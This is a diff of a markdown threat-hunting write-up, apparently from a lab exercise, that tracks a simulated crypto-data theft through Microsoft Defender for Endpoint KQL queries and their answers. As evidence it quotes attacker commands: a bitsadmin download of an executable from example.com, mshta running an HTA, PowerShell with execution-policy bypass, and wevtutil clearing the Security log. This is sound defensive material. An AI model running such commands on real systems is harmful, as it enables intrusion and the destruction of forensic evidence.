@@ -1,8 +1,43 @@
 # Operation Crypto Harvest: Tracking a Financially Motivated Intrusion Through MDE Forensics
 
-**Date Started:** July 12, 2025  
+**Date Completed:** July 12, 2025  
 
-**Objective:** This threat hunt tracks an attacker targeting crypto-related financial data, leveraging LOLBins, PowerShell downgrade techniques, and anti-forensic measures. The investigation was performed entirely within **Microsoft Defender for Endpoint (MDE)** using advanced hunting queries.
+**Objective:** This threat hunt tracked a financially motivated attacker targeting crypto-related data. The investigation followed the entire kill chain from initial execution to log clearing, using **Microsoft Defender for Endpoint (MDE)** telemetry and KQL queries.
+
+---
+
+## **Step 0 – Pre-Flag: Initial Entry Point Identification**
+
+### **Objective**  
+Identify the starting point for investigation based on initial threat intelligence.
+
+### **Threat Intel Guidance**  
+- Activity duration: 2–3 days  
+- Executions originating from Temp folders  
+- Key date of interest: June 15, 2025
+
+### **Query Used**  
+
+```kusto
+DeviceProcessEvents
+| where Timestamp between (datetime(2025-06-12) .. datetime(2025-06-17))
+| where FolderPath contains "Temp"
+| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine
+| order by Timestamp asc
+```
+
+### **Answer**  
+
+```
+Device: michaelvm  
+Timestamp: 2025-06-15T09:27:09Z  
+FileName: MpSigStub.exe  
+FolderPath: C:\Windows\Temp\1AF8D39A-D93B-4519-BD22-76533450984E\MpSigStub.exe  
+ProcessCommandLine: MpSigStub.exe /stub 1.1.24010.2001 /payload 4.18.25040.2 /program C:\Windows\SoftwareDistribution\Download\Install\UpdatePlatform.amd64fre.exe
+```
+
+### **Analysis**  
+The execution of a legitimate LOLBin (`MpSigStub.exe`) from a Temp directory, with chained execution of another binary, suggested potential abuse. This confirmed **michaelvm** as the correct starting point for further investigation.
 
 ---
 
@@ -26,7 +61,7 @@ DeviceProcessEvents
 "powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The earliest suspicious PowerShell execution launched a wallet generation script, suggesting initial credential harvesting or crypto-related foothold establishment.
 
 ---
@@ -52,7 +87,7 @@ DeviceProcessEvents
 badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The SHA256 hash corresponds to a custom reconnaissance binary used by the attacker to enumerate system and network information.
 
 ---
@@ -75,7 +110,7 @@ DeviceFileEvents
 QuarterlyCryptoHoldings.docx
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker targeted sensitive financial information, accessing a document detailing quarterly crypto holdings, revealing clear monetary motivation.
 
 ---
@@ -100,7 +135,7 @@ DeviceEvents
 2025-06-16T06:12:28.2856483Z
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 This was the final manual read of the sensitive document before exfiltration, aligning with late-stage collection activity.
 
 ---
@@ -125,7 +160,7 @@ DeviceProcessEvents
 "bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker abused Bitsadmin (a known LOLBin) to stealthily download malicious tooling under the guise of a legitimate file transfer.
 
 ---
@@ -150,7 +185,7 @@ DeviceFileEvents
 ledger_viewer.exe
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 This malicious payload was staged in the Temp directory to masquerade as legitimate finance-related software.
 
 ---
@@ -175,7 +210,7 @@ DeviceProcessEvents
 "mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 HTA execution via MSHTA.exe indicates social engineering and LOLBin abuse for script-based payload execution.
 
 ---
@@ -200,7 +235,7 @@ DeviceProcessEvents
 801262e122db6a2e758962896f260b55bbd0136a
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker leveraged ADS to hide malicious DLLs within document files, a known stealth tactic to evade detection.
 
 ---
@@ -225,7 +260,7 @@ DeviceRegistryEvents
 HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The persistence mechanism ensured execution of the malicious PowerShell script on reboot, confirming long-term access intent.
 
 ---
@@ -249,7 +284,7 @@ DeviceProcessEvents
 MarketHarvestJob
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker scheduled this malicious job to automate payload execution, supporting ongoing data theft.
 
 ---
@@ -274,7 +309,7 @@ DeviceProcessEvents
 centralsrvr
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker pivoted laterally to this key server, signaling expansion of the compromise to sensitive infrastructure.
 
 ---
@@ -299,7 +334,7 @@ DeviceProcessEvents
 2025-06-17T03:00:49.525038Z
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 This marks the exact time the attacker initiated lateral movement to `centralsrvr`.
 
 ---
@@ -324,7 +359,7 @@ DeviceFileEvents
 b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker accessed a sensitive financial document, confirming the data theft motive.
 
 ---
@@ -350,7 +385,7 @@ DeviceProcessEvents
 2e5a8590cf6848968fc23de3fa1e25f1
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker used a custom PowerShell script (`exfiltratedata.ps1`) to exfiltrate data to an external server.
 
 ---
@@ -375,7 +410,7 @@ DeviceNetworkEvents
 104.22.69.199
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker exfiltrated data to this external IP, which is linked to an unauthorized cloud service.
 
 ---
@@ -401,7 +436,7 @@ DeviceProcessEvents
 2025-06-18T10:52:59.0847063Z
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker downgraded PowerShell to version 2 to bypass AMSI logging, a known anti-forensic technique.
 
 ---
@@ -427,17 +462,19 @@ DeviceProcessEvents
 2025-06-18T06:52:33Z
 ```
 
-### **Analysis**  
+### **Analysis & Evidence**  
 The attacker cleared the Security event log using `wevtutil.exe cl Security`, an explicit anti-forensic step to erase evidence of malicious activity.
 
 ---
 
 # **Conclusion**
 
-This hunt successfully tracked a financially motivated attacker through **initial execution, lateral movement, data exfiltration, and anti-forensic cleanup** using only MDE telemetry. The findings highlight the importance of:
+This investigation successfully tracked the attacker from initial Temp-based LOLBin abuse to final log-clearing anti-forensics. Key takeaways include:
 
-- Monitoring LOLBin abuse (`bitsadmin.exe`, `mshta.exe`, `wevtutil.exe`).
+- **Initial Foothold:** LOLBin abuse (`MpSigStub.exe`) in Temp directories confirmed initial entry.
 
-- Detecting PowerShell downgrade attempts.
+- **Persistence & Lateral Movement:** Registry autoruns, scheduled tasks, and lateral movement to `centralsrvr` were identified.
 
-- Correlating process creation and persistence indicators to establish a full attack timeline.
+- **Financial Motivation:** Multiple targeted crypto/financial documents confirm the attacker’s motive.
+
+- **Exfiltration & Cleanup:** Data exfiltration via `exfiltratedata.ps1` to `104.22.69.199`, followed by PowerShell downgrade and Security log clearing (`wevtutil.exe`).
